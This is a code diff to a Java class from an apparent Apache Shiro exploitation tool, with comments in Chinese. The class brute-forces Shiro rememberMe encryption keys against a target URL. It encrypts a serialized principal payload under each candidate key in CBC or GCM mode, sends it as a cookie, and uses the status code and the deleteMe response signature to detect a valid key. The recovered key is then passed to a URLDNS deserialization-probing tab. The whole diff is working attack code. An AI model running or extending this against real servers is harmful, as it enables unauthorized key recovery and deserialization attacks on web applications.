@@ -9,6 +9,7 @@ import com.y5neko.shiroexp.request.HttpRequest;
 import com.y5neko.shiroexp.ui.tabpane.Shiro550Tab;
 import com.y5neko.shiroexp.ui.tabpane.URLDNSTab;
 import javafx.application.Platform;
+import javafx.scene.control.TextArea;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
@@ -22,11 +23,30 @@ import java.util.Objects;
 
 public class BruteKey {
     /**
+     * 追加日志并自动滚动到底部的辅助方法
+     * @param logTextArea 日志文本框
+     * @param text 要追加的文本
+     */
+    private static void appendLogWithScroll(TextArea logTextArea, String text) {
+        logTextArea.appendText(text);
+        logTextArea.setScrollTop(Double.MAX_VALUE);
+    }
+
+    /**
      * @param url 目标地址
      * @return 正确的key
      */
     public static KeyInfoObj bruteKey(TargetOBJ url, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
         return bruteKey(url, "rememberMe", globalComponents);
+    }
+
+    /**
+     * @param url 目标地址
+     * @param cryptType 加密模式（"爆破所有"、"CBC" 或 "GCM"）
+     * @return 正确的key
+     */
+    public static KeyInfoObj bruteKey(TargetOBJ url, Shiro550Tab.GlobalComponents globalComponents, String cryptType) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
+        return bruteKey(url, "rememberMe", globalComponents, cryptType);
     }
 
     /**
@@ -36,45 +56,91 @@ public class BruteKey {
      * @return 正确的key
      */
     public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
+        // 默认使用"爆破所有"模式
+        return bruteKey(url, rememberMeString, globalComponents, "爆破所有");
+    }
+
+    /**
+     * key爆破模块
+     * @param url 目标地址
+     * @param rememberMeString 自定义rememberMe字段名
+     * @param cryptType 加密模式（"爆破所有"、"CBC" 或 "GCM"）
+     * @return 正确的key
+     */
+    public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString, Shiro550Tab.GlobalComponents globalComponents, String cryptType) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
         String key;
         String checkData = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
         String[] keys = Tools.multiLoadFile("./misc/keys.txt");
         KeyInfoObj keyInfoObj = new KeyInfoObj();
+
+        // 判断爆破模式
+        boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
+        boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);
 
         boolean checkFlag = false;
 
         // 遍历key字典进行爆破
         for (String s : keys) {
 
+            // 检查是否需要停止
+            if (globalComponents.stopFlag) {
+                Platform.runLater(() -> {
+                    appendLogWithScroll(globalComponents.logArea, "[INFO]检测已停止\n");
+                });
+                return keyInfoObj;
+            }
+
             // 延迟100ms，防止UI线程冲突
             try {
                 Thread.sleep(100);
             } catch (InterruptedException e) {
-                System.out.println(e.getMessage());
+                // 线程被中断，退出爆破
+                Platform.runLater(() -> {
+                    appendLogWithScroll(globalComponents.logArea, "[INFO]检测已停止\n");
+                });
+                return keyInfoObj;
             }
 
-            String payload_cbc = rememberMeString + "=" + Tools.CBC_Encrypt(s, checkData);
-            String payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(s, checkData);
+            // 根据加密模式生成对应的 payload
+            String payload_cbc = null;
+            String payload_gcm = null;
 
-            // 构造3种payload进行对比
+            if (tryCBC) {
+                payload_cbc = rememberMeString + "=" + Tools.CBC_Encrypt(s, checkData);
+            }
+            if (tryGCM) {
+                payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(s, checkData);
+            }
+
+            // 构造请求进行对比
             Map<String, String> headers_123 = new HashMap<>();
             headers_123.put("Cookie", rememberMeString + "=" + "123");
             ResponseOBJ response_123 = HttpRequest.httpRequest(url, null, headers_123, "GET");
 
-            Map<String, String> headers_cbc = new HashMap<>();
-            headers_cbc.put("Cookie", payload_cbc);
-            ResponseOBJ response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");
+            Map<String, String> headers_cbc = null;
+            ResponseOBJ response_cbc = null;
 
-            Map<String, String> headers_gcm = new HashMap<>();
-            headers_gcm.put("Cookie", payload_gcm);
-            ResponseOBJ response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");
+            if (tryCBC && payload_cbc != null) {
+                headers_cbc = new HashMap<>();
+                headers_cbc.put("Cookie", payload_cbc);
+                response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");
+            }
+
+            Map<String, String> headers_gcm = null;
+            ResponseOBJ response_gcm = null;
+
+            if (tryGCM && payload_gcm != null) {
+                headers_gcm = new HashMap<>();
+                headers_gcm.put("Cookie", payload_gcm);
+                response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");
+            }
 
             // 先判断是否存在shiro框架
             if (Objects.requireNonNull(response_123.getHeaders().get("Set-Cookie")).contains(rememberMeString) && !checkFlag) {
                 System.out.println(Log.buffer_logging("INFO", "存在shiro框架"));
                 if (globalComponents.logArea!= null) {
                     Platform.runLater(() -> {
-                        globalComponents.logArea.appendText("[INFO]存在shiro框架\n");
+                        appendLogWithScroll(globalComponents.logArea, "[INFO]存在shiro框架\n");
                     });
                     checkFlag = true;
                 }
@@ -82,7 +148,7 @@ public class BruteKey {
                 System.out.println(Log.buffer_logging("INFO", "不存在shiro框架"));
                 if (globalComponents.logArea!= null) {
                     Platform.runLater(() -> {
-                        globalComponents.logArea.appendText("[INFO]不存在shiro框架\n");
+                        appendLogWithScroll(globalComponents.logArea, "[INFO]不存在shiro框架\n");
                     });
                 }
                 return keyInfoObj;
@@ -93,31 +159,35 @@ public class BruteKey {
             // UI打印
             if (globalComponents.logArea != null) {
                 Platform.runLater(() -> {
-                    globalComponents.logArea.appendText("[INFO]正在尝试key: " + s + "\n");
+                    appendLogWithScroll(globalComponents.logArea, "[INFO]正在尝试key: " + s + "\n");
                 });
             }
 
             // 判断响应
             // shiro在密钥错误时会返回400状态码，并且响应体中会包含deleteMe特征
-            // 第一种情况：没有deleteMe特征，不存在shiro框架
-            // 第二种情况：CBC模式的payload状态码不为400，并且响应体中没有deleteMe特征，说明CBC模式的payload是有效的
-            // 第三种情况：GCM模式的payload状态码不为400，并且响应体中没有deleteMe特征，说明GCM模式的payload是有效的
-            if (response_cbc != null && response_gcm != null) {
+            if (response_cbc != null || response_gcm != null) {
                 int length_123 = response_123.getHeaders().size();
-                int length_cbc = response_cbc.getHeaders().size();
-                int length_gcm = response_gcm.getHeaders().size();
 
-                if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
-                    key = s;
-                    keyInfoObj.setKey(key);
-                    keyInfoObj.setType("CBC");
-                    break;
+                // 检查 CBC 模式
+                if (tryCBC && response_cbc != null) {
+                    int length_cbc = response_cbc.getHeaders().size();
+                    if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
+                        key = s;
+                        keyInfoObj.setKey(key);
+                        keyInfoObj.setType("CBC");
+                        break;
+                    }
                 }
-                if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
-                    key = s;
-                    keyInfoObj.setKey(key);
-                    keyInfoObj.setType("GCM");
-                    break;
+
+                // 检查 GCM 模式
+                if (tryGCM && response_gcm != null) {
+                    int length_gcm = response_gcm.getHeaders().size();
+                    if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
+                        key = s;
+                        keyInfoObj.setKey(key);
+                        keyInfoObj.setType("GCM");
+                        break;
+                    }
                 }
             }
         }
@@ -125,19 +195,20 @@ public class BruteKey {
         // 处理前端显示
         if (globalComponents.logArea != null) {
             Platform.runLater(() -> {
-                globalComponents.logArea.appendText("[SUCC]发现key: " + keyInfoObj.getKey() + "，类型为：" + keyInfoObj.getType() + "\n");
+                appendLogWithScroll(globalComponents.logArea, "[SUCC]发现key: " + keyInfoObj.getKey() + "，类型为：" + keyInfoObj.getType() + "\n");
                 globalComponents.rememberMeField.setText(keyInfoObj.getKey());
                 globalComponents.cryptTypeComboBox.getSelectionModel().select(keyInfoObj.getType());
 
                 // 自动同步到 FindClassByURLDNS 标签页
-                globalComponents.logArea.appendText("========================================\n");
-                globalComponents.logArea.appendText("[提示] 配置已自动同步到「FindClassByURLDNS」标签页\n");
-                globalComponents.logArea.appendText("========================================\n\n");
+                appendLogWithScroll(globalComponents.logArea, "========================================\n");
+                appendLogWithScroll(globalComponents.logArea, "[提示] 配置已自动同步到「FindClassByURLDNS」标签页\n");
+                appendLogWithScroll(globalComponents.logArea, "========================================\n\n");
             });
         }
 
-        // 调用 URLDNS 探测标签页的更新方法
-        URLDNSTab.updateFromShiro550Static(url.getUrl(), keyInfoObj.getKey(), rememberMeString);
+        // 调用 URLDNS 探测标签页的更新方法（包含加密模式和请求方式）
+        String requestType = globalComponents.requestTypeComboBox != null ? globalComponents.requestTypeComboBox.getValue() : "GET";
+        URLDNSTab.updateFromShiro550Static(url.getUrl(), keyInfoObj.getKey(), rememberMeString, keyInfoObj.getType(), requestType);
 
         return keyInfoObj;
     }
